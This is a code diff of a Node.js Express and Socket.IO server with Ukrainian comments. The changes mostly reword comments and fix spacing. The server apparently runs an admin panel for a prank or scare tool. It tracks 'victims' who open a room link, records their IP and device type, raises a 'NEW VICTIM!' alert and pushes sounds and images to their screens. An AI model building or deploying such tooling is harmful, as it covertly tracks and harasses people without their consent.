@@ -6,12 +6,13 @@ const { v4: uuidv4 } = require('uuid');
 
 app.use(express.static('public'));
 app.use(express.json());
+
 app.get('/', (req, res) => res.redirect('/admin.html'));
 
 const sessions = {}; // {id: {sound, image, createdAt}}
 const activeVictims = {}; // {socketId: {roomId, device, ip, ...}}
 
-// Створення
+// Створення нової кімнати
 app.post('/create', (req, res) => {
     const { sound, image } = req.body;
     const id = uuidv4();
@@ -20,7 +21,7 @@ app.post('/create', (req, res) => {
     res.json({ id, createdAt });
 });
 
-// === НОВА ФУНКЦІЯ: Оновлення звуку/картинки ===
+// ОНОВЛЕННЯ звуку/картинки для існуючої кімнати
 app.post('/update-session/:id', (req, res) => {
     const id = req.params.id;
     const { sound, image } = req.body;
@@ -32,20 +33,20 @@ app.post('/update-session/:id', (req, res) => {
     if (sound) sessions[id].sound = sound;
     if (image) sessions[id].image = image;
 
-    // Повідомляємо всіх у кімнаті (жертв) про зміну
+    // Повідомляємо всіх жертв у кімнаті про нові медіа
     io.to(id).emit('update-media', { sound: sessions[id].sound, image: sessions[id].image });
 
     res.json({ success: true, session: sessions[id] });
 });
 
-// Інфо сесії
+// Отримання інформації про сесію
 app.get('/session/:id', (req, res) => {
     const session = sessions[req.params.id];
     if (session) res.json(session);
     else res.status(404).json({ error: 'Not found' });
 });
 
-// Статус для історії
+// Статус кімнат для історії
 app.post('/check-status', (req, res) => {
     const { ids } = req.body;
     const result = ids.map(id => {
@@ -61,7 +62,7 @@ app.post('/check-status', (req, res) => {
     res.json(result);
 });
 
-// --- SOCKETS ---
+// --- SOCKET.IO ---
 io.on('connection', (socket) => {
 
     socket.on('join-room-admin', (roomId) => {
@@ -85,7 +86,7 @@ io.on('connection', (socket) => {
         sendVictimList(data.roomId);
         io.to(data.roomId).emit('admin-alert', { msg: 'NEW VICTIM!' });
 
-        // Надсилаємо поточні медіа новій жертві одразу після підключення
+        // Надсилаємо актуальні медіа новій жертві
         if (sessions[data.roomId]) {
             socket.emit('update-media', {
                 sound: sessions[data.roomId].sound,
@@ -114,11 +115,11 @@ function sendVictimList(roomId) {
 }
 
 function parseDevice(ua) {
-    if(!ua) return "Unknown";
-    if(ua.includes('Android')) return "📱 Android";
-    if(ua.includes('iPhone')) return "📱 iPhone";
-    if(ua.includes('Windows')) return "💻 Windows PC";
-    if(ua.includes('Macintosh')) return "💻 Mac";
+    if (!ua) return "Unknown";
+    if (ua.includes('Android')) return "📱 Android";
+    if (ua.includes('iPhone')) return "📱 iPhone";
+    if (ua.includes('Windows')) return "💻 Windows PC";
+    if (ua.includes('Macintosh')) return "💻 Mac";
     return "📱 Device";
 }
 
